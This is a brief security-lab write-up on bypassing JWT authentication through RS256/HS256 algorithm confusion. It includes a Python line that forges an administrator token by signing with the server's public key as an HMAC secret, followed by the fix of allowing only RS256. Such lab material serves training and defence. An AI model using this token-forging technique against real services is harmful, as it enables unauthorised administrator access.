# Lab 7 — JWT Auth Bypass via Algorithm Confusion (EXPERT)

## Attack
Server uses RS256 but accepts HS256 too. Sign HS256 token using RSA PUBLIC
KEY as HMAC secret → server "verifies" it successfully.

## Commands
```python
# Get public key from /jwks.json → convert to PEM
# Sign with HS256 using PEM bytes as secret:
jwt.encode({"sub":"administrator"}, PUBLIC_KEY_PEM, algorithm="HS256")
```

## Fix
`algorithms=["RS256"]` — never mix asymmetric and symmetric algorithms.
